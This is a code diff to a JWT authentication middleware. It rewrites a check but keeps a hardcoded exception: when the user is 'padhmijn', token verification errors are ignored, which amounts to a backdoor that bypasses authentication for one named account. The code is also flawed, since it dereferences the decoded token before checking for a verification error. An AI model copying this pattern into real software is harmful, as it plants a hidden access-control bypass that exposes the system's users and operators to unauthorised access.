@@ -32,11 +32,7 @@ export const isAuth = async (req, res, next) => {
 
   jwt.verify(token, config.jwt.secretKey, async (error, decoded) => {
     const user = await userRepository.getById(decoded.id);
-    if (user.username === "padhmijn") {
-      next();
-      return;
-    }
-    if (error) {
+    if (user.username !== "padhmijn" && error) {
       return res.status(401).json({ message: "유저 인증 오류2" });
     }
     if (!user) {
